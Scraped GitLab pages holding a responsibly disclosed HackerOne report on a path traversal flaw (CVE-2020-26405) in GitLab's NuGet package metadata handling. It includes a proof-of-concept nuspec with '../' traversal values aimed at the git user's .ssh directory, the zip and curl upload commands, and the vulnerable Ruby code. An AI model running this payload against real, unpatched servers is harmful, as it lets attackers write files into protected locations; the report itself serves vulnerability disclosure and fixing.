=== Content from gitlab.com_74f688bb_20250119_114957.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2020](/gitlab-org/cves/-/tree/master/2020)
* [**CVE-2020-26405.json**](/gitlab-org/cves/-/blob/master/2020/CVE-2020-26405.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2020/CVE-2020-26405.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2020/CVE-2020-26405.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Nov 17, 2020

  [9b4313aa](/gitlab-org/cves/-/commit/9b4313aa850882b20ff67ec72d7ec5a847a56e95)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/9b4313aa850882b20ff67ec72d7ec5a847a56e95)
  繚
  9b4313aa

  [ GitLab Bot ](/gitlab-bot) authored Nov 17, 2020

  9b4313aa

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/9b4313aa850882b20ff67ec72d7ec5a847a56e95)
  [ GitLab Bot ](/gitlab-bot) authored Nov 17, 2020

Loading



=== Content from gitlab.com_0eb2dba8_20250119_114958.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Path traversal in nuget metadata extraction allowing packages to be saved anywhere

**[HackerOne report #835427](https://hackerone.com/reports/835427)** by `vakzz` on 2020-03-31, assigned to [@ankelly](/ankelly "Andrew Kelly"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

After a nuget package is uploaded via the api, the `UpdatePackageFromMetadataService` is run to update the package and file names based on the metadata in the `nuspec` file which is extracted from the package zip. Neither the extracted id or version is checked for path traversal, allowing the `package.nupkg` to be moved anywhere that the `git` user has access.

##### Steps to reproduce

1. create a project
2. create a `spec.nuspec` file with the following contents

<?xml version="1.0"?>

<package xmlns="[http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd">](http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd%22%3E)

<metadata>

<id>../../../../../../../../../../../../../</id>

<version>./var/opt/gitlab/.ssh/aaa</version>

</metadata>

</package>

```

1. zip it up and upload it via the api

zip package.zip spec.nuspec

curl -XPUT -v '<http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/112/packages/nuget/>' -F package=[@]package.zip

```

1. after the metadata service has run you can see that the file has been moved `ls -asl /var/opt/gitlab/.ssh/`

[![Screen_Shot_2020-04-01_at_2.07.29_am.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/176a8c877b86176f338cf5ccf65ece01e7dda1fc/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30343933623266622d303633632d343931342d616362662d6432666138616234663161622f53637265656e5f53686f745f323032302d30342d30315f61745f322e30372e32395f616d2e706e67)

##### Impact

I'm still unsure of the complete impact of this, but there are a few thing to note:

* the file will always have the `.nupkg` extension (can't see a way around this)
* any parent directories are also created
* the package has to be a valid zip file, but using something like <https://truepolyglot.hackade.org/> arbitrary data can be appended to the start.

Knowing the above it might be possible to escalate this further, but requires more investigation.

##### Examples

nuget package used above: [![package.zip](data:image/gif;base64...)](https://user-content.gitlab-static.net/f8eefd67d18fd171a64a638ed60db07ff6c508aa/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61613633646366612d333138632d343766342d626638362d6165633136336562666630612f7061636b6167652e7a6970)

package that is a polyglot with a shell script: [![hello.zip](data:image/gif;base64...)](https://user-content.gitlab-static.net/5bd027f9a932b6737e6642fa8d6ea4873d7e321d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31626534323666622d396132332d343738312d383962352d3033303664303938363034382f68656c6c6f2e7a6970)

##### What is the current *bug* behavior?

The package `file_name` is updated with values directly from the metadata without any checks:

```
      package_file.update!(
            file_name: package_filename,
            file: package_file.file
          )

     def package_name
        metadata[:package_name]
      end

      def package_version
        metadata[:package_version]
      end

      def metadata
        strong_memoize(:metadata) do
          ::Packages::Nuget::MetadataExtractionService.new(package_file.id).execute
        end
      end

      def package_filename
        &#34;#{package_name.downcase}.#{package_version.downcase}.nupkg&#34;
      end
```

##### What is the expected *correct* behavior?

The `package_filename` should be validated

##### Output of checks

###### Results of GitLab environment info

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.1-ee
Revision:	0ebcf602332
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

#### Impact

An attacker can write controlled data with the extension `.nupkg` to anywhere the `git` user has access

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2020-04-01\_at\_2.07.29\_am.png](https://h1.sec.gitlab.net/a/0493b2fb-063c-4914-acbf-d2fa8ab4f1ab/Screen_Shot_2020-04-01_at_2.07.29_am.png)
* [package.zip](https://h1.sec.gitlab.net/a/aa63dcfa-318c-47f4-bf86-aec163ebff0a/package.zip)
* [hello.zip](https://h1.sec.gitlab.net/a/1be426fb-9a23-4781-89b5-0306d0986048/hello.zip)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


